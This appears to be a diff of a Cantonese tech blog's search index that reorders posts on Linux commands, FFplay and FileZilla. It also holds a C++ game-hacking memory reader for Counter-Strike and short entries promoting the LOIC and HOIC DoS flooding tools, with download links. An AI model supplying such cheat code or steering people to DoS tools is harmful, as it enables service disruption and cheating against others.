pEntry.th32ProcessID;</span><br><span class="line">			<span class="built_in">CloseHandle</span>(hProcessId);</span><br><span class="line">			handle = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="literal">false</span>, process);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hProcessId, &amp;pEntry));</span><br><span class="line">	<span class="keyword">return</span> process;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uintptr_t</span> <span class="title">MemMan::getModule</span><span class="params">(<span class="keyword">uintptr_t</span> procId, <span class="keyword">const</span> <span class="keyword">wchar_t</span>* modName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hModule = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, procId);</span><br><span class="line">	MODULEENTRY32 mEntry;</span><br><span class="line">	mEntry.dwSize = <span class="built_in"><span class="keyword">sizeof</span></span>(mEntry);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!_wcsicmp(mEntry.szModule, modName))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">CloseHandle</span>(hModule);</span><br><span class="line">			<span class="keyword">return</span> (<span class="keyword">uintptr_t</span>)mEntry.hModule;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="built_in">Module32Next</span>(hModule, &amp;mEntry));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uintptr_t</span> <span class="title">MemMan::getAddress</span><span class="params">(<span class="keyword">uintptr_t</span> addr, std::vector&lt;<span class="keyword">uintptr_t</span>&gt; vect)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; vect.<span class="built_in">size</span>(); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">ReadProcessMemory</span>(handle, (BYTE*)addr, &amp;addr, <span class="built_in"><span class="keyword">sizeof</span></span>(addr), <span class="number">0</span>);</span><br><span class="line">		addr += vect[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Counter-Strike Global Offensive</category>
+        <category>Programming</category>
+      </categories>
+      <tags>
+        <tag>Games</tag>
+        <tag>Game Hacking</tag>
+        <tag>CPP</tag>
       </tags>
   </entry>
   <entry>
@@ -2351,21 +2351,22 @@
       </tags>
   </entry>
   <entry>
-    <title>FileZilla Client - Server 連接應用工具</title>
-    <url>/2021/12/15/FileZilla-Client/</url>
-    <content><![CDATA[<img src="filezilla.svg" width="200" height="200"/>
+    <title>FFplay - 詳情參數播放器</title>
+    <url>/2022/01/14/FFplay-commands/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>ffplay 可以用黎播片，分析影片數據，改片大細，視頻圖像的運動估計方向，音頻數據的波形等。</p>
+<p>普通播片</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffplay file.mp4</span><br></pre></td></tr></table></figure>
 
-<h1 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h1><p>FileZilla Client 係一個俾你用黎Connect 你既 Server 用既一個軟件，<br>佢有 Mac 版，Linux版，Windows版<br>並且支持 FTP，SSL / TLS 等<br>有下載，上載等唔同既功能</p>
-<p>官方網站 : <a href="https://filezilla-project.org/">FileZilla</a></p>
-<h1 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h1><img src="/2021/12/15/FileZilla-Client/program.png" class="">
+<p>FTP Live</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffplay rtsp://127.0.0.1/file.mp4</span><br></pre></td></tr></table></figure>
 
-
-<h1 id="安裝-Linux"><a href="#安裝-Linux" class="headerlink" title="安裝 (Linux)"></a>安裝 (Linux)</h1><h2 id="喺-Debian-Ubuntu-系統上裝"><a href="#喺-Debian-Ubuntu-系統上裝" class="headerlink" title="喺 Debian, Ubuntu 系統上裝"></a>喺 Debian, Ubuntu 系統上裝</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install filezilla</span><br></pre></td></tr></table></figure>]]></content>
+<p>參考資料 :<br><a href="https://www.itread01.com/articles/1476439233.html">https://www.itread01.com/articles/1476439233.html</a><br><a href="https://blog.xuite.net/ian11832/blogg/37940154-ffmpeg,ffserver,ffplay%E7%9B%B8%E9%97%9C%E8%AA%AA%E6%98%8E%E7%AD%86%E8%A8%98">https://blog.xuite.net/ian11832/blogg/37940154-ffmpeg,ffserver,ffplay%E7%9B%B8%E9%97%9C%E8%AA%AA%E6%98%8E%E7%AD%86%E8%A8%98</a></p>
+]]></content>
       <categories>
-        <category>Linux</category>
+        <category>FFMPEG</category>
       </categories>
       <tags>
-        <tag>Gui</tag>
+        <tag>指令</tag>
       </tags>
   </entry>
   <entry>
@@ -2396,6 +2397,24 @@
       </categories>
       <tags>
         <tag>程式</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>FileZilla Client - Server 連接應用工具</title>
+    <url>/2021/12/15/FileZilla-Client/</url>
+    <content><![CDATA[<img src="filezilla.svg" width="200" height="200"/>
+
+<h1 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h1><p>FileZilla Client 係一個俾你用黎Connect 你既 Server 用既一個軟件，<br>佢有 Mac 版，Linux版，Windows版<br>並且支持 FTP，SSL / TLS 等<br>有下載，上載等唔同既功能</p>
+<p>官方網站 : <a href="https://filezilla-project.org/">FileZilla</a></p>
+<h1 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h1><img src="/2021/12/15/FileZilla-Client/program.png" class="">
+
+
+<h1 id="安裝-Linux"><a href="#安裝-Linux" class="headerlink" title="安裝 (Linux)"></a>安裝 (Linux)</h1><h2 id="喺-Debian-Ubuntu-系統上裝"><a href="#喺-Debian-Ubuntu-系統上裝" class="headerlink" title="喺 Debian, Ubuntu 系統上裝"></a>喺 Debian, Ubuntu 系統上裝</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install filezilla</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Gui</tag>
       </tags>
   </entry>
   <entry>
@@ -2461,25 +2480,6 @@
 ]]></content>
       <categories>
         <category>Windows</category>
-      </categories>
-      <tags>
-        <tag>指令</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>FFplay - 詳情參數播放器</title>
-    <url>/2022/01/14/FFplay-commands/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>ffplay 可以用黎播片，分析影片數據，改片大細，視頻圖像的運動估計方向，音頻數據的波形等。</p>
-<p>普通播片</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffplay file.mp4</span><br></pre></td></tr></table></figure>
-
-<p>FTP Live</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffplay rtsp://127.0.0.1/file.mp4</span><br></pre></td></tr></table></figure>
-
-<p>參考資料 :<br><a href="https://www.itread01.com/articles/1476439233.html">https://www.itread01.com/articles/1476439233.html</a><br><a href="https://blog.xuite.net/ian11832/blogg/37940154-ffmpeg,ffserver,ffplay%E7%9B%B8%E9%97%9C%E8%AA%AA%E6%98%8E%E7%AD%86%E8%A8%98">https://blog.xuite.net/ian11832/blogg/37940154-ffmpeg,ffserver,ffplay%E7%9B%B8%E9%97%9C%E8%AA%AA%E6%98%8E%E7%AD%86%E8%A8%98</a></p>
-]]></content>
-      <categories>
-        <category>FFMPEG</category>
       </categories>
       <tags>
         <tag>指令</tag>
@@ -2937,27 +2937,6 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       </tags>
   </entry>
   <entry>
-    <title>Hoic 高軌道離子炮 - DoS 網路測試工具</title>
-    <url>/2022/06/08/High-Orbit-Ion-Cannon-Apps-DOS/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>High Orbit Ion Cannon (HOIC) 是一個開源網絡壓力測試和拒絕服務攻擊應用程序，旨在同時攻擊多達 256 個 URL。 </p>
-<img src="/2022/06/08/High-Orbit-Ion-Cannon-Apps-DOS/hoic.png" class="">
-
-<h2 id="特徵"><a href="#特徵" class="headerlink" title="特徵"></a>特徵</h2><ul>
-<li>高速多線程 HTTP 洪水功擊</li>
-<li>可以同時功擊 256 個網站</li>
-</ul>
-<h1 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h1><ul>
-<li><a href="https://sourceforge.net/projects/highorbitioncannon/">https://sourceforge.net/projects/highorbitioncannon/</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>DoS</category>
-      </categories>
-      <tags>
-        <tag>Network</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hugo 超快速教學</title>
     <url>/2022/01/29/Hugo-quick-start/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上一篇就教左大家點裝 Hugo<br>未睇既可以撳呢條 <a href="/2022/01/28/Debian-install-Hugo/">Link</a> 睇返</p>
@@ -3002,6 +2981,27 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
         <tag>指令</tag>
         <tag>網站</tag>
         <tag>Framework</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hoic 高軌道離子炮 - DoS 網路測試工具</title>
+    <url>/2022/06/08/High-Orbit-Ion-Cannon-Apps-DOS/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>High Orbit Ion Cannon (HOIC) 是一個開源網絡壓力測試和拒絕服務攻擊應用程序，旨在同時攻擊多達 256 個 URL。 </p>
+<img src="/2022/06/08/High-Orbit-Ion-Cannon-Apps-DOS/hoic.png" class="">
+
+<h2 id="特徵"><a href="#特徵" class="headerlink" title="特徵"></a>特徵</h2><ul>
+<li>高速多線程 HTTP 洪水功擊</li>
+<li>可以同時功擊 256 個網站</li>
+</ul>
+<h1 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h1><ul>
+<li><a href="https://sourceforge.net/projects/highorbitioncannon/">https://sourceforge.net/projects/highorbitioncannon/</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>DoS</category>
+      </categories>
+      <tags>
+        <tag>Network</tag>
       </tags>
   </entry>
   <entry>
@@ -3456,6 +3456,21 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       </tags>
   </entry>
   <entry>
+    <title>Linux - 指令查 Pulic ip</title>
+    <url>/2022/01/14/Linux-find-publicip-with-commands/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有機部機喺冇 Gui 又或者唔想用 Browser 既情況下又想查下你而加既 Public ip 係乜既時候，你得返 Terminal俾你用，呢個時候就要學識點樣用指令查 Public ip.</p>
+<h1 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl ifconfig.me</span><br><span class="line">curl -4/-6 icanhazip.com</span><br><span class="line">curl ipinfo.io/ip</span><br><span class="line">curl api.ipify.org</span><br><span class="line">curl checkip.dyndns.org</span><br><span class="line">dig +short myip.opendns.com @resolver1.opendns.com</span><br><span class="line">host myip.opendns.com resolver1.opendns.com</span><br><span class="line">curl ident.me</span><br><span class="line">curl bot.whatismyipaddress.com</span><br><span class="line">curl ipecho.net/plain</span><br></pre></td></tr></table></figure>
+
+<p>參考資料:<br><a href="https://opensource.com/article/18/5/how-find-ip-address-linux">https://opensource.com/article/18/5/how-find-ip-address-linux</a></p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>指令</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux - 修改 Terminal linux@user Display 顏色</title>
     <url>/2022/01/28/Linux-change-terminal-user-color/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今篇文係講點樣改 Linux 既 Terminal 原本個 show user host 隻色 (Foreground).</p>
@@ -3494,18 +3509,26 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       </tags>
   </entry>
   <entry>
-    <title>Linux - 指令查 Pulic ip</title>
-    <url>/2022/01/14/Linux-find-publicip-with-commands/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有機部機喺冇 Gui 又或者唔想用 Browser 既情況下又想查下你而加既 Public ip 係乜既時候，你得返 Terminal俾你用，呢個時候就要學識點樣用指令查 Public ip.</p>
-<h1 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl ifconfig.me</span><br><span class="line">curl -4/-6 icanhazip.com</span><br><span class="line">curl ipinfo.io/ip</span><br><span class="line">curl api.ipify.org</span><br><span class="line">curl checkip.dyndns.org</span><br><span class="line">dig +short myip.opendns.com @resolver1.opendns.com</span><br><span class="line">host myip.opendns.com resolver1.opendns.com</span><br><span class="line">curl ident.me</span><br><span class="line">curl bot.whatismyipaddress.com</span><br><span class="line">curl ipecho.net/plain</span><br></pre></td></tr></table></figure>
+    <title>Linux - 熄機指令 | Halt</title>
+    <url>/2022/02/02/Linux-halt-commands/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>shutdown 同 poweroff 既分別就係</p>
+<p>shutdown 係會好有系統咁將你所有服務，程式熄哂之後先再幫你熄機，<br>而 poweroff 同 halt 係直接將你系統既電源切斷，強制關機。</p>
+<p>除非你部機真係死左，如果唔係都建議你用 shutdown 黎熄機。</p>
+<h2 id="Halt-熄機"><a href="#Halt-熄機" class="headerlink" title="Halt 熄機"></a>Halt 熄機</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">halt -f </span><br></pre></td></tr></table></figure>
 
-<p>參考資料:<br><a href="https://opensource.com/article/18/5/how-find-ip-address-linux">https://opensource.com/article/18/5/how-find-ip-address-linux</a></p>
+<p>or </p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">halt</span><br></pre></td></tr></table></figure>
+
+<h2 id="Halt-重開機"><a href="#Halt-重開機" class="headerlink" title="Halt 重開機"></a>Halt 重開機</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">halt --reboot</span><br></pre></td></tr></table></figure>
+
+<p>參考資料<br><a href="https://www.geeksforgeeks.org/halt-poweroff-and-reboot-commands-in-linux/">https://www.geeksforgeeks.org/halt-poweroff-and-reboot-commands-in-linux/</a></p>
 ]]></content>
       <categories>
         <category>Linux</category>
       </categories>
       <tags>
         <tag>指令</tag>
+        <tag>熄機</tag>
       </tags>
   </entry>
   <entry>
@@ -3528,29 +3551,6 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       <tags>
         <tag>指令</tag>
         <tag>壓縮</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux - 熄機指令 | Halt</title>
-    <url>/2022/02/02/Linux-halt-commands/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>shutdown 同 poweroff 既分別就係</p>
-<p>shutdown 係會好有系統咁將你所有服務，程式熄哂之後先再幫你熄機，<br>而 poweroff 同 halt 係直接將你系統既電源切斷，強制關機。</p>
-<p>除非你部機真係死左，如果唔係都建議你用 shutdown 黎熄機。</p>
-<h2 id="Halt-熄機"><a href="#Halt-熄機" class="headerlink" title="Halt 熄機"></a>Halt 熄機</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">halt -f </span><br></pre></td></tr></table></figure>
-
-<p>or </p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">halt</span><br></pre></td></tr></table></figure>
-
-<h2 id="Halt-重開機"><a href="#Halt-重開機" class="headerlink" title="Halt 重開機"></a>Halt 重開機</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">halt --reboot</span><br></pre></td></tr></table></figure>
-
-<p>參考資料<br><a href="https://www.geeksforgeeks.org/halt-poweroff-and-reboot-commands-in-linux/">https://www.geeksforgeeks.org/halt-poweroff-and-reboot-commands-in-linux/</a></p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>指令</tag>
-        <tag>熄機</tag>
       </tags>
   </entry>
   <entry>
@@ -3961,6 +3961,34 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       </tags>
   </entry>
   <entry>
+    <title>Liunx - fuser 查檔案 Socket</title>
+    <url>/2022/01/09/Liunx-fuser-commands/</url>
+    <content><![CDATA[<h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><p>fuser 是用於查詢正在使用某個檔案、目錄或socket的程式，提供有關擁有該程式的使用者和訪問型別的資訊。<br>fuser工具顯示了使用指定檔案或檔案系統的每個程式的程式 ID (PID)。</p>
+<h1 id="安裝"><a href="#安裝" class="headerlink" title="安裝"></a>安裝</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install psmisc -y</span><br></pre></td></tr></table></figure>
+
+<h1 id="help"><a href="#help" class="headerlink" title="help"></a>help</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> fuser --<span class="built_in">help</span></span></span><br><span class="line">Usage: fuser [-fMuvw] [-a|-s] [-4|-6] [-c|-m|-n SPACE] [-k [-i] [-SIGNAL]] NAME...</span><br><span class="line">       fuser -l</span><br><span class="line">       fuser -V</span><br><span class="line">Show which processes use the named files, sockets, or filesystems.</span><br><span class="line"></span><br><span class="line">  -a,--all              display unused files too</span><br><span class="line">  -i,--interactive      ask before killing (ignored without -k)</span><br><span class="line">  -k,--kill             kill processes accessing the named file</span><br><span class="line">  -l,--list-signals     list available signal names</span><br><span class="line">  -m,--mount            show all processes using the named filesystems or block device</span><br><span class="line">  -M,--ismountpoint     fulfill request only if NAME is a mount point</span><br><span class="line">  -n,--namespace SPACE  search in this name space (file, udp, or tcp)</span><br><span class="line">  -s,--silent           silent operation</span><br><span class="line">  -SIGNAL               send this signal instead of SIGKILL</span><br><span class="line">  -u,--user             display user IDs</span><br><span class="line">  -v,--verbose          verbose output</span><br><span class="line">  -w,--writeonly        kill only processes with write access</span><br><span class="line">  -V,--version          display version information</span><br><span class="line">  -4,--ipv4             search IPv4 sockets only</span><br><span class="line">  -6,--ipv6             search IPv6 sockets only</span><br><span class="line">  -                     reset options</span><br><span class="line"></span><br><span class="line">  udp/tcp names: [local_port][,[rmt_host][,[rmt_port]]]</span><br></pre></td></tr></table></figure>
+
+<h2 id="檢查指定-Port-Number"><a href="#檢查指定-Port-Number" class="headerlink" title="檢查指定 Port Number"></a>檢查指定 Port Number</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fuser 8080/tcp</span><br></pre></td></tr></table></figure>
+
+<h2 id="終止指定-Port-Number-執行-tcp的程式"><a href="#終止指定-Port-Number-執行-tcp的程式" class="headerlink" title="終止指定 Port Number 執行 tcp的程式"></a>終止指定 Port Number 執行 tcp的程式</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fuser -k 8080/tcp</span><br></pre></td></tr></table></figure>
+
+<h2 id="檢視某個目錄的程式"><a href="#檢視某個目錄的程式" class="headerlink" title="檢視某個目錄的程式"></a>檢視某個目錄的程式</h2><p>fuser序可以與 <code>-v</code> 選項一起使用，該選項以詳細模式執行該工具。<br>verbose選項用於在計算機螢幕上生成詳細輸出，因此使用者可以實時檢視實用程式正在執行的操作。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> fuser -v .</span></span><br><span class="line">                     USER        PID ACCESS COMMAND</span><br><span class="line">/home/winbert:       winbert    1435 ..c.. bash</span><br></pre></td></tr></table></figure>
+
+<h2 id="檢視已使用-tcp-或-udp-Port的程式"><a href="#檢視已使用-tcp-或-udp-Port的程式" class="headerlink" title="檢視已使用 tcp 或 udp Port的程式"></a>檢視已使用 <code>tcp</code> 或 <code>udp</code> Port的程式</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> fuser -v -n tcp 80</span></span><br><span class="line">                     USER        PID ACCESS COMMAND</span><br><span class="line">80/tcp:              root      27411 F.... docker-proxy</span><br></pre></td></tr></table></figure>
+
+
+<p>參考資料 :<br><a href="https://iter01.com/513597.html">https://iter01.com/513597.html</a></p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>指令</tag>
+        <tag>Port</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux - Terminal 小遊戲</title>
     <url>/2022/01/16/Linux-terminal-games/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>成日對 Server 對 Terminal 指令，<br>都真係幾唔放鬆，但唔緊要，Terminal 其實都有 Game 玩<br>以下介紹幾款俾大家！</p>
@@ -3996,6 +4024,23 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       </tags>
   </entry>
   <entry>
+    <title>Loic 低軌道離子炮 - DoS 網路測試工具</title>
+    <url>/2022/06/08/Low-Orbit-Ion-Cannon-Apps-DOS/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Low Orbit Ion Cannon (LOIC) 是一個用 C# 編寫的開源網絡壓力測試和拒絕服務攻擊應用程序。<br>LOIC 通過向服務器發送 TCP、UDP 或 HTTP 數據包來對目標站點執行 DoS 攻擊，目的是中斷特定主機的服務。</p>
+<img src="/2022/06/08/Low-Orbit-Ion-Cannon-Apps-DOS/loic.png" class="">
+
+<h1 id="Gituhb"><a href="#Gituhb" class="headerlink" title="Gituhb"></a>Gituhb</h1><ul>
+<li><a href="https://github.com/NewEraCracker/LOIC">https://github.com/NewEraCracker/LOIC</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>DoS</category>
+      </categories>
+      <tags>
+        <tag>Network</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux - unzip zip 壓縮檔案工具</title>
     <url>/2022/01/14/Linux-unzip-zip-commands/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>要在 Linux 系統 下解壓及壓縮 Windows 上的 zip 檔，可以使用 zip 及 unzip 工具。</p>
@@ -4018,51 +4063,6 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       <tags>
         <tag>指令</tag>
         <tag>壓縮</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Liunx - fuser 查檔案 Socket</title>
-    <url>/2022/01/09/Liunx-fuser-commands/</url>
-    <content><![CDATA[<h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><p>fuser 是用於查詢正在使用某個檔案、目錄或socket的程式，提供有關擁有該程式的使用者和訪問型別的資訊。<br>fuser工具顯示了使用指定檔案或檔案系統的每個程式的程式 ID (PID)。</p>
-<h1 id="安裝"><a href="#安裝" class="headerlink" title="安裝"></a>安裝</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install psmisc -y</span><br></pre></td></tr></table></figure>
-
-<h1 id="help"><a href="#help" class="headerlink" title="help"></a>help</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> fuser --<span class="built_in">help</span></span></span><br><span class="line">Usage: fuser [-fMuvw] [-a|-s] [-4|-6] [-c|-m|-n SPACE] [-k [-i] [-SIGNAL]] NAME...</span><br><span class="line">       fuser -l</span><br><span class="line">       fuser -V</span><br><span class="line">Show which processes use the named files, sockets, or filesystems.</span><br><span class="line"></span><br><span class="line">  -a,--all              display unused files too</span><br><span class="line">  -i,--interactive      ask before killing (ignored without -k)</span><br><span class="line">  -k,--kill             kill processes accessing the named file</span><br><span class="line">  -l,--list-signals     list available signal names</span><br><span class="line">  -m,--mount            show all processes using the named filesystems or block device</span><br><span class="line">  -M,--ismountpoint     fulfill request only if NAME is a mount point</span><br><span class="line">  -n,--namespace SPACE  search in this name space (file, udp, or tcp)</span><br><span class="line">  -s,--silent           silent operation</span><br><span class="line">  -SIGNAL               send this signal instead of SIGKILL</span><br><span class="line">  -u,--user             display user IDs</span><br><span class="line">  -v,--verbose          verbose output</span><br><span class="line">  -w,--writeonly        kill only processes with write access</span><br><span class="line">  -V,--version          display version information</span><br><span class="line">  -4,--ipv4             search IPv4 sockets only</span><br><span class="line">  -6,--ipv6             search IPv6 sockets only</span><br><span class="line">  -                     reset options</span><br><span class="line"></span><br><span class="line">  udp/tcp names: [local_port][,[rmt_host][,[rmt_port]]]</span><br></pre></td></tr></table></figure>
-
-<h2 id="檢查指定-Port-Number"><a href="#檢查指定-Port-Number" class="headerlink" title="檢查指定 Port Number"></a>檢查指定 Port Number</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fuser 8080/tcp</span><br></pre></td></tr></table></figure>
-
-<h2 id="終止指定-Port-Number-執行-tcp的程式"><a href="#終止指定-Port-Number-執行-tcp的程式" class="headerlink" title="終止指定 Port Number 執行 tcp的程式"></a>終止指定 Port Number 執行 tcp的程式</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fuser -k 8080/tcp</span><br></pre></td></tr></table></figure>
-
-<h2 id="檢視某個目錄的程式"><a href="#檢視某個目錄的程式" class="headerlink" title="檢視某個目錄的程式"></a>檢視某個目錄的程式</h2><p>fuser序可以與 <code>-v</code> 選項一起使用，該選項以詳細模式執行該工具。<br>verbose選項用於在計算機螢幕上生成詳細輸出，因此使用者可以實時檢視實用程式正在執行的操作。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> fuser -v .</span></span><br><span class="line">                     USER        PID ACCESS COMMAND</span><br><span class="line">/home/winbert:       winbert    1435 ..c.. bash</span><br></pre></td></tr></table></figure>
-
-<h2 id="檢視已使用-tcp-或-udp-Port的程式"><a href="#檢視已使用-tcp-或-udp-Port的程式" class="headerlink" title="檢視已使用 tcp 或 udp Port的程式"></a>檢視已使用 <code>tcp</code> 或 <code>udp</code> Port的程式</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> fuser -v -n tcp 80</span></span><br><span class="line">                     USER        PID ACCESS COMMAND</span><br><span class="line">80/tcp:              root      27411 F.... docker-proxy</span><br></pre></td></tr></table></figure>
-
-
-<p>參考資料 :<br><a href="https://iter01.com/513597.html">https://iter01.com/513597.html</a></p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>指令</tag>
-        <tag>Port</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Loic 低軌道離子炮 - DoS 網路測試工具</title>
-    <url>/2022/06/08/Low-Orbit-Ion-Cannon-Apps-DOS/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Low Orbit Ion Cannon (LOIC) 是一個用 C# 編寫的開源網絡壓力測試和拒絕服務攻擊應用程序。<br>LOIC 通過向服務器發送 TCP、UDP 或 HTTP 數據包來對目標站點執行 DoS 攻擊，目的是中斷特定主機的服務。</p>
-<img src="/2022/06/08/Low-Orbit-Ion-Cannon-Apps-DOS/loic.png" class="">
-
-<h1 id="Gituhb"><a href="#Gituhb" class="headerlink" title="Gituhb"></a>Gituhb</h1><ul>
-<li><a href="https://github.com/NewEraCracker/LOIC">https://github.com/NewEraCracker/LOIC</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>DoS</category>
-      </categories>
-      <tags>
-        <tag>Network</tag>
       </tags>
   </entry>
   <entry>
@@ -4215,6 +4215,16 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       </tags>
   </entry>
   <entry>
+    <title>Malware Map Live</title>
+    <url>/2022/02/02/Malware-Map-Live/</url>
+    <content><![CDATA[<h1 id="冇咩特別"><a href="#冇咩特別" class="headerlink" title="冇咩特別"></a>冇咩特別</h1><p>實時 Malware 情況</p>
+<p><a href="https://threatmap.checkpoint.com/">https://threatmap.checkpoint.com/</a></p>
+<img src="/2022/02/02/Malware-Map-Live/live.png" class="">]]></content>
+      <tags>
+        <tag>病毒</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Manjaro pacman 指令</title>
     <url>/2022/01/29/Manjaro-pacman-commands/</url>
     <content><![CDATA[<h1 id="Update"><a href="#Update" class="headerlink" title="Update"></a>Update</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -Sy</span><br></pre></td></tr></table></figure>
@@ -4253,65 +4263,6 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       </categories>
       <tags>
         <tag>指令</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Malware Map Live</title>
-    <url>/2022/02/02/Malware-Map-Live/</url>
-    <content><![CDATA[<h1 id="冇咩特別"><a href="#冇咩特別" class="headerlink" title="冇咩特別"></a>冇咩特別</h1><p>實時 Malware 情況</p>
-<p><a href="https://threatmap.checkpoint.com/">https://threatmap.checkpoint.com/</a></p>
-<img src="/2022/02/02/Malware-Map-Live/live.png" class="">]]></content>
-      <tags>
